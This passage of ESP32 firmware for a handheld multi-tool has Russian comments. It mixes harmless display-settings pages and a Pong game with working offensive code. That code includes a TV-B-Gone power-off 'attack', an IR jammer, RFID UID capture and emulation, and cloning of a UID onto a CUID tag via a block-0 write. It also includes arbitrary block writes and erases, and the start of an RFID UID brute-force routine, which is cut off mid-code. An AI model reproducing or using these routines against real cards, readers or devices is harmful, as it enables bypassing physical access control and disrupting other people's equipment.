// 8. СТРАНИЦА DISPLAY (ПОДМЕНЮ, ПОВОРОТ, ЦВЕТ, ЯРКОСТЬ)
// ======================================================================
void drawDisplaySubMenu() {
  drawGenericSubMenu("DISPLAY SETTINGS", displaySubMenuItemsText, DISPLAY_SUB_MENU_COUNT, displaySubMenuIndex, displaySubMenuScrollOffset);
}

void drawRotationPage() {
  drawHeaderBar("ROTATION");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 30);
  canvas.print("Current Rotation:");
  canvas.setTextSize(3);
  canvas.setCursor(55, 50);
  canvas.print(currentRotation);
  canvas.setTextSize(1);
  canvas.setCursor(10, 90);
  canvas.print("UP/DN: Change");
  drawFooterBar("OK: Save  ESC: Cancel");
  canvasFlush();
}

void drawColorPage() {
  drawHeaderBar("ACCENT COLOR");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 30);
  canvas.print("Active Color:");
  canvas.setTextColor(colorValuesList[selectedColorIndex]);
  canvas.setTextSize(2);
  canvas.setCursor(20, 55);
  canvas.print(colorNamesList[selectedColorIndex]);
  canvas.setTextSize(1);
  canvas.setCursor(10, 90);
  canvas.print("UP/DN: Change");
  drawFooterBar("OK: Save  ESC: Cancel");
  canvasFlush();
}

void drawBrightnessPage() {
  drawHeaderBar("BRIGHTNESS");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 30);
  canvas.print("Brightness:");
  int percent = map(backlightBrightness, 0, 255, 0, 100);
  canvas.setTextSize(2);
  canvas.setCursor(30, 50);
  canvas.print(percent);
  canvas.print("%");
  canvas.setTextSize(1);
  int barWidth = map(backlightBrightness, 0, 255, 0, 100);
  canvas.drawRect(14, 70, 100, 12, accentColor);
  canvas.fillRect(15, 71, barWidth, 10, accentColor);
  canvas.setCursor(10, 95);
  canvas.print("UP/DN: Change");
  drawFooterBar("OK: Save  ESC: Cancel");
  canvasFlush();
}

// ======================================================================
// 9. ИГРЫ (PONG)
// ======================================================================
void resetPongGameState() {
  pongState.playerY = 50;
  pongState.aiY = 50;
  pongState.ballX = 64;
  pongState.ballY = 64;
  pongState.ballVX = 2.2;
  pongState.ballVY = 1.5;
  pongState.scorePlayer = 0;
  pongState.scoreAi = 0;
  pongState.gameOver = false;
}

void renderPongGameLoop(bool isUp, bool isDown, bool isOk) {
  canvas.fillScreen(COLOR_BLACK);
  if (pongState.gameOver) {
    canvas.setTextColor(COLOR_RED);
    canvas.setTextSize(2);
    canvas.setCursor(15, 35);
    canvas.print("GAME OVER");
    canvas.setTextSize(1);
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(20, 60);
    canvas.printf("Score: P:%d - AI:%d", pongState.scorePlayer, pongState.scoreAi);
    canvas.setCursor(15, 85);
    canvas.setTextColor(COLOR_CYAN);
    canvas.print("Press OK to restart");
    drawFooterBar("OK:Restart ESC:Back");
    canvasFlush();
    if (isOk) resetPongGameState();
    return;
  }
  if (digitalRead(BTN_UP) == LOW && pongState.playerY > 2) pongState.playerY -= 3;
  if (digitalRead(BTN_DOWN) == LOW && pongState.playerY < 108) pongState.playerY += 3;
  for (int y = 0; y < 128; y += 8) {
    canvas.drawFastVLine(64, y, 4, COLOR_DARKGREY);
  }
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(45, 5);
  canvas.print(pongState.scorePlayer);
  canvas.setCursor(75, 5);
  canvas.print(pongState.scoreAi);
  pongState.ballX += pongState.ballVX;
  pongState.ballY += pongState.ballVY;
  if (pongState.ballY <= 2 || pongState.ballY >= 124) {
    pongState.ballVY = -pongState.ballVY;
  }
  if (pongState.aiY + 8 < pongState.ballY) pongState.aiY += 2;
  else if (pongState.aiY + 8 > pongState.ballY) pongState.aiY -= 2;
  if (pongState.aiY < 2) pongState.aiY = 2;
  if (pongState.aiY > 108) pongState.aiY = 108;
  if (pongState.ballX <= 8 && pongState.ballY >= pongState.playerY && pongState.ballY <= pongState.playerY + 18) {
    pongState.ballVX = -pongState.ballVX * 1.05;
    pongState.ballX = 9;
  }
  if (pongState.ballX >= 118 && pongState.ballY >= pongState.aiY && pongState.ballY <= pongState.aiY + 18) {
    pongState.ballVX = -pongState.ballVX * 1.05;
    pongState.ballX = 117;
  }
  if (pongState.ballX < 0) {
    pongState.scoreAi++;
    pongState.ballX = 64; pongState.ballY = 64;
    pongState.ballVX = 2.0;
    if (pongState.scoreAi >= 5) pongState.gameOver = true;
  }
  if (pongState.ballX > 128) {
    pongState.scorePlayer++;
    pongState.ballX = 64; pongState.ballY = 64;
    pongState.ballVX = -2.0;
    if (pongState.scorePlayer >= 5) pongState.gameOver = true;
  }
  canvas.fillRect(4, pongState.playerY, 3, 18, accentColor);
  canvas.fillRect(121, pongState.aiY, 3, 18, COLOR_RED);
  canvas.fillRect((int)pongState.ballX, (int)pongState.ballY, 3, 3, COLOR_WHITE);
  drawFooterBar("UP/DN:Move ESC:Exit");
  canvasFlush();
}

// ======================================================================
// РЕЖИМ РАДАРА (Wi-Fi сканер с визуализацией)
// ======================================================================
void drawRadarPage() {
  drawHeaderBar("WIFI RADAR");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 30);
  canvas.print("Scanning air...");
  canvasFlush();

  radar.updateTargets(); // <-- первое сканирование

  while (digitalRead(BTN_ESC) == HIGH) {
    radar.draw(canvas, accentColor);
    canvas.setTextColor(COLOR_WHITE);
    canvas.setCursor(2, 118);
    canvas.print("ESC:Exit");
    canvasFlush();
    updateBuzzer();
    delay(50);  // <-- эта задержка нормальная
    yield();
  }

  wirelessCurrentSubPage = 0;
  wifiAttackSubPage = 0;
  redrawFlag = true;
}

// ======================================================================
// 10. IR МОДУЛЬ
// ======================================================================
void drawIrConsolePage() {
  drawHeaderBar("IR CONSOLE (RX/TX)");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 24);
  canvas.print("Status: Listening...");
  canvas.setCursor(5, 38);
  if (activeIrSignal.valid) {
    canvas.setTextColor(COLOR_GREEN);
    canvas.print("Captured Signal:");
    canvas.setCursor(5, 50);
    canvas.setTextColor(COLOR_YELLOW);
    canvas.print("Proto: ");
    canvas.print(typeToString(activeIrSignal.type));
    canvas.setCursor(5, 62);
    canvas.printf("Val  : 0x%X", (uint32_t)activeIrSignal.value);
    canvas.setCursor(5, 74);
    canvas.printf("Bits : %d", activeIrSignal.bits);
  } else {
    canvas.setTextColor(COLOR_RED);
    canvas.print("No IR signal in RAM");
    canvas.setCursor(5, 55);
    canvas.setTextColor(COLOR_WHITE);
    canvas.print("Point remote to RX");
  }
  drawFooterBar("UP:Save list  DN:Save log  OK:Send  ESC:Back");
  canvasFlush();
}

void processIrRxTask() {
  if (irrecv.decode(&irResults)) {
    activeIrSignal.type = irResults.decode_type;
    activeIrSignal.value = irResults.value;
    activeIrSignal.bits = irResults.bits;
    activeIrSignal.valid = true;
    irrecv.resume();
  }
}

void transmitCapturedIrSignal() {
  if (!activeIrSignal.valid) return;
  drawHeaderBar("TRANSMITTING...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 50);
  canvas.print("Sending IR Signal!");
  canvasFlush();
  irsend.send(activeIrSignal.type, activeIrSignal.value, activeIrSignal.bits);
  delay(300);
  pinMode(IR_RX_PIN, INPUT);
  irrecv.enableIRIn();
  drawIrConsolePage();
}

void saveCapturedIrLogToSd() {
  if (!activeIrSignal.valid) return;
  if (isSdCardAvailable) {
    appendIrLogToSd(activeIrSignal.type, activeIrSignal.value, activeIrSignal.bits);
    drawHeaderBar("SD SAVED!");
    canvas.setTextColor(COLOR_GREEN);
    canvas.setCursor(5, 50);
    canvas.print("IR Logged to SD!");
  } else {
    drawHeaderBar("SD ERROR!");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No MicroSD Card!");
  }
  canvasFlush();
  delay(1200);
  drawIrConsolePage();
}

void saveIrSignalToSdList(decode_type_t proto, uint64_t val, uint16_t bits) {
  if (!activeIrSignal.valid) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No IR signal in RAM!");
    canvasFlush();
    delay(1000);
    return;
  }
  if (!isSdCardAvailable) {
    drawHeaderBar("SD ERROR!");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No MicroSD Card!");
    canvasFlush();
    delay(1000);
    return;
  }
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File file = SD.open("/ir_saved.txt", FILE_APPEND);
  if (file) {
    file.printf("%s:0x%X:%d\n", typeToString(proto).c_str(), (uint32_t)val, bits);
    file.close();
    drawHeaderBar("SAVED!");
    canvas.setTextColor(COLOR_GREEN);
    canvas.setCursor(5, 50);
    canvas.print("Signal saved to /ir_saved.txt");
  } else {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("Could not open file!");
  }
  digitalWrite(SD_CS, HIGH);
  canvasFlush();
  delay(1200);
  drawIrConsolePage();
}

void runClassicTvBGoneLoop() {
  drawHeaderBar("CLASSIC TV-B-GONE");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 25);
  canvas.print("ATTACK ACTIVE!");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 40);
  canvas.print("Transmitting codes...");
  canvasFlush();
  for (uint8_t i = 0; i < TV_B_GONE_TOTAL_CODES; i++) {
    if (digitalRead(BTN_ESC) == LOW) {
      drawHeaderBar("TV-B-GONE");
      canvas.setTextColor(COLOR_RED);
      canvas.setCursor(5, 50);
      canvas.print("Attack Canceled!");
      canvasFlush();
      delay(800);
      return;
    }
    const IrCodeEntry &entry = tvBGoneDatabase[i];
    canvas.fillRect(0, 55, 128, 55, COLOR_BLACK);
    canvas.setTextColor(COLOR_CYAN);
    canvas.setCursor(5, 60);
    canvas.printf("Code %d/%d", i + 1, TV_B_GONE_TOTAL_CODES);
    canvas.setTextColor(COLOR_GREEN);
    canvas.setCursor(5, 75);
    canvas.print(entry.brandName);
    canvas.setTextColor(COLOR_DARKGREY);
    canvas.setCursor(5, 90);
    canvas.printf("0x%08X", entry.code);
    drawFooterBar("ESC: Stop Attack");
    canvasFlush();
    irsend.send(entry.protocol, entry.code, entry.bits);
    updateBuzzer();
    delay(120);
  }
  drawHeaderBar("TV-B-GONE");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("ALL CODES SENT!");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 70);
  canvas.print("Press OK to repeat");
  drawFooterBar("OK:Repeat ESC:Back");
  canvasFlush();
}

void runIrJammer() {
  if (!irJammerActive) return;
  drawHeaderBar("IR JAMMER");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 25);
  canvas.print("JAMMING ACTIVE!");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 45);
  canvas.print("Sending 38kHz bursts...");
  drawFooterBar("ESC to Stop");
  canvasFlush();
  unsigned long nextSend = millis();
  while (irJammerActive) {
    if (digitalRead(BTN_ESC) == LOW) {
      irJammerActive = false;
      break;
    }
    if (millis() - nextSend >= 50) {
      nextSend = millis();
      irsend.sendNEC(0x20DF10EF, 32);
      irsend.sendNEC(0xE0E040BF, 32);
    }
    updateBuzzer();
    yield();
  }
  drawHeaderBar("IR JAMMER");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 50);
  canvas.print("Stopped.");
  canvasFlush();
  delay(800);
}

void loadIrSignalList() {
  savedIrCount = 0;
  if (!isSdCardAvailable) return;
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, LOW);
  File file = SD.open("/ir_saved.txt", FILE_READ);
  if (!file) {
    digitalWrite(SD_CS, HIGH);
    return;
  }
  while (file.available() && savedIrCount < MAX_SAVED_IR) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      savedIrList[savedIrCount++] = line;
    }
    updateBuzzer();
  }
  file.close();
  digitalWrite(SD_CS, HIGH);
}

void sendIrSavedSignal(int index) {
  if (index < 0 || index >= savedIrCount) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("Invalid index!");
    canvasFlush();
    delay(1000);
    return;
  }
  String line = savedIrList[index];
  int firstColon = line.indexOf(':');
  int lastColon = line.lastIndexOf(':');
  if (firstColon == -1 || lastColon == -1 || firstColon == lastColon) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("Malformed line!");
    canvasFlush();
    delay(1000);
    return;
  }
  String protoStr = line.substring(0, firstColon);
  String valStr = line.substring(firstColon + 1, lastColon);
  String bitsStr = line.substring(lastColon + 1);
  uint64_t val = strtoull(valStr.c_str(), NULL, 16);
  uint16_t bits = bitsStr.toInt();
  decode_type_t proto = UNKNOWN;
  if (protoStr == "NEC") proto = NEC;
  else if (protoStr == "SONY") proto = SONY;
  else if (protoStr == "PANASONIC") proto = PANASONIC;
  else if (protoStr == "JVC") proto = JVC;
  else if (protoStr == "RC5") proto = RC5;
  else if (protoStr == "RC6") proto = RC6;
  else if (protoStr == "SAMSUNG") proto = SAMSUNG;
  else if (protoStr == "LG") proto = LG;
  else if (protoStr == "GREE") proto = GREE;
  else if (protoStr == "DAIKIN") proto = DAIKIN;
  else if (protoStr == "MITSUBISHI") proto = MITSUBISHI;
  else if (protoStr == "UNKNOWN") proto = UNKNOWN;
  drawHeaderBar("SENDING");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 30);
  canvas.print("Sending saved IR:");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 45);
  canvas.print(protoStr);
  canvas.setCursor(5, 60);
  canvas.printf("0x%X (%d bits)", (uint32_t)val, bits);
  canvasFlush();
  irsend.send(proto, val, bits);
  delay(300);
  drawIrSavedListPage();
}

void drawIrSavedListPage() {
  drawHeaderBar("SAVED IR SIGNALS");
  if (savedIrSelected < savedIrScroll) savedIrScroll = savedIrSelected;
  if (savedIrSelected >= savedIrScroll + MAX_VISIBLE_ITEMS) {
    savedIrScroll = savedIrSelected - MAX_VISIBLE_ITEMS + 1;
  }
  if (savedIrScroll < 0) savedIrScroll = 0;
  if (savedIrScroll > savedIrCount - MAX_VISIBLE_ITEMS) {
    savedIrScroll = savedIrCount - MAX_VISIBLE_ITEMS;
  }
  if (millis() - marqueeTimer > 200) {
    marqueeTimer = millis();
    marqueeOffset++;
  }
  for (uint8_t i = 0; i < MAX_VISIBLE_ITEMS; i++) {
    int idx = i + savedIrScroll;
    if (idx >= savedIrCount) break;
    int lineY = 25 + i * 20;
    String line = savedIrList[idx];
    if (idx == savedIrSelected) {
      canvas.fillRoundRect(2, lineY - 3, 124, 17, 3, accentColor);
      canvas.setTextColor(COLOR_BLACK);
      canvas.setCursor(4, lineY);
      canvas.print("> ");
      if (line.length() * 6 > 100) {
        int shift = marqueeOffset % (line.length() + 3);
        String subText = line.substring(shift) + "   " + line.substring(0, shift);
        canvas.print(subText.substring(0, 16));
      } else {
        canvas.print(line);
      }
    } else {
      canvas.setTextColor(COLOR_WHITE);
      canvas.setCursor(4, lineY);
      canvas.print("  ");
      if (line.length() > 18) line = line.substring(0, 18) + "...";
      canvas.print(line);
    }
  }
  if (savedIrCount > MAX_VISIBLE_ITEMS) {
    int barHeight = 85 / savedIrCount;
    int barY = 25 + (savedIrScroll * 85) / savedIrCount;
    canvas.drawFastVLine(126, 25, 85, COLOR_DARKGREY);
    canvas.fillRect(125, barY, 3, barHeight < 5 ? 5 : barHeight, accentColor);
  }
  drawFooterBar("UP/DN:Select  OK:Send  ESC:Back");
  canvasFlush();
}



void drawBuzzerPage() {
  drawHeaderBar("BUZZER");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 30);
  canvas.print("Screen sound:");
  canvas.setTextColor(buzzerEnabled ? COLOR_GREEN : COLOR_RED);
  canvas.setCursor(85, 30);
  canvas.print(buzzerEnabled ? "ON" : "OFF");

  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 45);
  canvas.print("Volume:");
  int percent = map(buzzerVolume, 0, 255, 0, 100);
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setTextSize(2);
  canvas.setCursor(60, 41);
  canvas.print(percent);
  canvas.print("%");
  canvas.setTextSize(1);

  int barWidth = map(percent, 0, 100, 0, 100);
  canvas.drawRect(14, 65, 100, 12, accentColor);
  canvas.fillRect(15, 66, barWidth, 10, accentColor);

  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(10, 90);
  canvas.print("UP/DN: Volume");
  canvas.setCursor(10, 100);
  canvas.print("OK: Toggle  ESC: Save");
  drawFooterBar("OK:Toggle ESC:Exit");
  canvasFlush();
}

// ======================================================================
// RFID – ФУНКЦИИ ДЛЯ РАБОТЫ С PN532
// ======================================================================

// ---- Отрисовка страницы чтения ----
void drawRfidReadPage() {
  drawHeaderBar("READ & SAVE TAG");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvas.print("Active UID:");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 37);
  canvas.print(activeRfidUidHex);
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 58);
  canvas.print("OK  : Scan Tag");
  canvas.setCursor(5, 73);
  canvas.print("DOWN: Save Flash/SD");
  drawFooterBar("OK:Scan DN:Save");
  canvasFlush();
}

// ---- Сканирование метки ----
void executeRfidTagScan() {
  if (!isRfidAvailable) {
    initializeRfidHardware();
    if (!isRfidAvailable) return;
  }
  drawHeaderBar("SCANNING...");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 50);
  canvas.print("Bring tag to PN532..");
  canvasFlush();
  nfc.SAMConfig();
  uint8_t success;
  uint8_t uid[7] = {0};
  uint8_t uidLength = 0;
  success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength, 250);
  if (success) {
    int pos = 0;
    activeRfidUidHex[0] = '\0';
    for (uint8_t i = 0; i < uidLength; i++) {
      pos += snprintf(activeRfidUidHex + pos, sizeof(activeRfidUidHex) - pos,
                      "%02X%s", uid[i], (i < uidLength - 1) ? ":" : "");
                      updateBuzzer();
    }
  } else {
    snprintf(activeRfidUidHex, sizeof(activeRfidUidHex), "No Tag Found");
  }
  drawRfidReadPage();
}

// ---- Сохранение активного UID во Flash и SD ----
void saveActiveRfidToStorage() {
  if (strcmp(activeRfidUidHex, "None") == 0 || strcmp(activeRfidUidHex, "No Tag Found") == 0) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No valid UID!");
    canvasFlush();
    delay(1000);
    drawRfidReadPage();
    return;
  }
  int targetSlot = -1;
  char checkBuf[32];
  for (int i = 0; i < RFID_SLOTS_MAX; i++) {
    readSavedUidFromFlash(i, checkBuf, sizeof(checkBuf));
    if (checkBuf[0] == '\0') {
      targetSlot = i;
      break;
    }
    updateBuzzer();
  }
  if (targetSlot == -1) targetSlot = 0;
  writeUidToFlashSlot(targetSlot, activeRfidUidHex);
  if (isSdCardAvailable) appendRfidLogToSd(activeRfidUidHex);
  drawHeaderBar("SAVED!");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 45);
  canvas.printf("Saved Slot %d", targetSlot);
  canvasFlush();
  delay(1200);
  drawRfidReadPage();
}

// ---- Эмуляция активного UID ----
void emulateActiveRfidUid() {
  if (!isRfidAvailable) {
    initializeRfidHardware();
    if (!isRfidAvailable) return;
  }
  if (strlen(activeRfidUidHex) < 8 || strcmp(activeRfidUidHex, "No Tag Found") == 0 ||
      strcmp(activeRfidUidHex, "None") == 0) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("No Valid Active UID!");
    canvasFlush();
    delay(1200);
    return;
  }
  uint8_t targetUid[4] = {0x12, 0x34, 0x56, 0x78};
  sscanf(activeRfidUidHex, "%hhx:%hhx:%hhx:%hhx", &targetUid[0], &targetUid[1], &targetUid[2], &targetUid[3]);
  drawHeaderBar("EMULATING TAG");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 25);
  canvas.print("Active Emulation:");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 40);
  canvas.print(activeRfidUidHex);
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 65);
  canvas.print("Bring reader close..");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 88);
  canvas.print("Hold ESC to Stop");
  canvasFlush();
  uint8_t cmd[] = {
    0x8C, 0x04, 0x04, 0x00,
    targetUid[0], targetUid[1], targetUid[2], targetUid[3],
    0x20
  };
  while (digitalRead(BTN_ESC) == HIGH) {
    nfc.sendCommandCheckAck(cmd, sizeof(cmd), 100);
    updateBuzzer();
    delay(100);
    yield();
  }
  initializeRfidHardware();
  drawHeaderBar("EMULATION");
  canvas.setTextColor(COLOR_GREEN);
  canvas.setCursor(5, 50);
  canvas.print("Emulation Stopped!");
  canvasFlush();
  delay(1000);
}

// ---- Отрисовка страницы записи UID ----
void drawRfidWriteUidPage() {
  drawHeaderBar("WRITE UID (CUID)");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvas.print("Target UID to Clone:");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 40);
  canvas.print(activeRfidUidHex);
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 60);
  canvas.print("Requires CUID Tag!");
  canvas.setCursor(5, 75);
  canvas.setTextColor(COLOR_CYAN);
  canvas.print("Press OK to Clone");
  drawFooterBar("OK: Clone UID ESC:Back");
  canvasFlush();
}

// ---- Запись UID на CUID-метку ----
void writeUidToCuidTag() {
  if (!isRfidAvailable) return;
  if (strlen(activeRfidUidHex) < 8 || strcmp(activeRfidUidHex, "No Tag Found") == 0) {
    drawHeaderBar("ERROR");
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 50);
    canvas.print("Invalid Active UID!");
    canvasFlush();
    delay(1200);
    drawRfidWriteUidPage();
    return;
  }
  drawHeaderBar("CLONING UID...");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 50);
  canvas.print("Place CUID Tag...");
  canvasFlush();
  uint8_t newUid[4] = {0};
  sscanf(activeRfidUidHex, "%hhx:%hhx:%hhx:%hhx", &newUid[0], &newUid[1], &newUid[2], &newUid[3]);
  uint8_t currentUid[7] = {0}, len = 0;
  nfc.SAMConfig();
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, currentUid, &len, 500)) {
    uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (nfc.mifareclassic_AuthenticateBlock(currentUid, len, 0, 0, key)) {
      uint8_t block0[16] = {
        newUid[0], newUid[1], newUid[2], newUid[3],
        (uint8_t)(newUid[0] ^ newUid[1] ^ newUid[2] ^ newUid[3]),
        0x08, 0x04, 0x00
      };
      uint8_t manuf[8] = {0x1D, 0x11, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00};
      memcpy(&block0[8], manuf, 8);
      if (nfc.mifareclassic_WriteDataBlock(0, block0)) {
        canvas.setTextColor(COLOR_GREEN);
        canvas.setCursor(5, 70);
        canvas.print("UID CLONED OK!");
      } else {
        canvas.setTextColor(COLOR_RED);
        canvas.setCursor(5, 70);
        canvas.print("Block0 Write Fail!");
      }
    } else {
      canvas.setTextColor(COLOR_RED);
      canvas.setCursor(5, 70);
      canvas.print("Auth Sector 0 Fail!");
    }
  } else {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 70);
    canvas.print("Tag Not Found!");
  }
  canvasFlush();
  delay(1600);
  drawRfidWriteUidPage();
}

// ---- Отрисовка страницы записи пользовательского блока ----
void drawRfidWriteCustomBlockPage() {
  drawHeaderBar("WRITE BLOCK DATA");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvas.print("Target Block:");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setTextSize(2);
  canvas.setCursor(35, 42);
  canvas.printf("Block %d", activeRfidBlock);
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 68);
  canvas.print("UP/DN: Change Block");
  canvas.setCursor(5, 83);
  canvas.print("OK   : Write Data");
  drawFooterBar("UP/DN:Blk OK:Write");
  canvasFlush();
}

// ---- Запись данных в произвольный блок ----
void writeDataToCustomBlock() {
  if (!isRfidAvailable) return;
  drawHeaderBar("WRITING BLOCK...");
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 50);
  canvas.printf("Writing Block %d", activeRfidBlock);
  canvasFlush();
  uint8_t uid[7] = {0}, len = 0;
  nfc.SAMConfig();
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) {
    uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (nfc.mifareclassic_AuthenticateBlock(uid, len, activeRfidBlock, 0, key)) {
      uint8_t data[16] = {'E','S','P','3','2','_','B','L','O','C','K','_','D','A','T','A'};
      if (nfc.mifareclassic_WriteDataBlock(activeRfidBlock, data)) {
        canvas.setTextColor(COLOR_GREEN);
        canvas.setCursor(5, 72);
        canvas.print("WRITE SUCCESS!");
      } else {
        canvas.setTextColor(COLOR_RED);
        canvas.setCursor(5, 72);
        canvas.print("Write Failed!");
      }
    } else {
      canvas.setTextColor(COLOR_RED);
      canvas.setCursor(5, 72);
      canvas.print("Auth Failed!");
    }
  } else {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 72);
    canvas.print("Tag Not Found!");
  }
  canvasFlush();
  delay(1500);
  drawRfidWriteCustomBlockPage();
}

// ---- Отрисовка страницы стирания блока ----
void drawRfidErasePage() {
  drawHeaderBar("ERASE TAG BLOCK");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 25);
  canvas.print("Format Block:");
  canvas.setTextColor(COLOR_RED);
  canvas.setTextSize(2);
  canvas.setCursor(35, 42);
  canvas.printf("Block %d", activeRfidBlock);
  canvas.setTextSize(1);
  canvas.setTextColor(COLOR_CYAN);
  canvas.setCursor(5, 68);
  canvas.print("UP/DN: Change Block");
  canvas.setCursor(5, 83);
  canvas.print("OK   : Clear (0x00)");
  drawFooterBar("UP/DN:Blk OK:Erase");
  canvasFlush();
}

// ---- Очистка блока (запись нулей) ----
void eraseDataOnCustomBlock() {
  if (!isRfidAvailable) return;
  drawHeaderBar("ERASING BLOCK...");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 50);
  canvas.printf("Clearing Block %d", activeRfidBlock);
  canvasFlush();
  uint8_t uid[7] = {0}, len = 0;
  nfc.SAMConfig();
  if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) {
    uint8_t key[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    if (nfc.mifareclassic_AuthenticateBlock(uid, len, activeRfidBlock, 0, key)) {
      uint8_t blank[16] = {0};
      if (nfc.mifareclassic_WriteDataBlock(activeRfidBlock, blank)) {
        canvas.setTextColor(COLOR_GREEN);
        canvas.setCursor(5, 72);
        canvas.print("BLOCK ERASED!");
      } else {
        canvas.setTextColor(COLOR_RED);
        canvas.setCursor(5, 72);
        canvas.print("Erase Failed!");
      }
    } else {
      canvas.setTextColor(COLOR_RED);
      canvas.setCursor(5, 72);
      canvas.print("Auth Failed!");
    }
  } else {
    canvas.setTextColor(COLOR_RED);
    canvas.setCursor(5, 72);
    canvas.print("Tag Not Found!");
  }
  canvasFlush();
  delay(1500);
  drawRfidErasePage();
}

// ---- Отрисовка сохранённых UID ----
void drawSavedRfidPage() {
  drawHeaderBar("FLASH UID STORAGE");
  if (rfidSavedSlotIndex < rfidSavedScrollOffset) rfidSavedScrollOffset = rfidSavedSlotIndex;
  if (rfidSavedSlotIndex >= rfidSavedScrollOffset + 4) rfidSavedScrollOffset = rfidSavedSlotIndex - 3;
  char buf[32];
  for (int i = 0; i < 4; i++) {
    int idx = i + rfidSavedScrollOffset;
    if (idx >= RFID_SLOTS_MAX) break;
    readSavedUidFromFlash(idx, buf, sizeof(buf));
    if (buf[0] == '\0') snprintf(buf, sizeof(buf), "[ Empty Slot ]");
    int y = 25 + i * 20;
    if (idx == rfidSavedSlotIndex) {
      canvas.fillRoundRect(3, y - 3, 122, 17, 3, accentColor);
      canvas.setTextColor(COLOR_BLACK);
    } else {
      canvas.setTextColor(COLOR_WHITE);
    }
    canvas.setCursor(5, y);
    canvas.printf("%d:%s", idx, buf);
    updateBuzzer();
  }
  drawFooterBar("OK:Select DN:Delete");
  canvasFlush();
}

// ---- Брутфорс UID (эмуляция всех возможных) ----
void bruteForceRfid() {
  drawHeaderBar("BRUTEFORCE RFID");
  canvas.setTextColor(COLOR_YELLOW);
  canvas.setCursor(5, 25);
  canvas.print("Emulating all UIDs");
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(5, 45);
  canvas.print("Place reader close.");
  canvas.setTextColor(COLOR_RED);
  canvas.setCursor(5, 65);
  canvas.print("Hold ESC to stop");
  drawFooterBar("ESC: Stop");
  canvasFlush();
  if (!isRfidAvailable) {
    initializeRfidHardware();
    if (!isRfidAvailable) return;
  }
  uint8_t cmd[] = {
    0x8C, 0x04, 0x04, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x20
  };
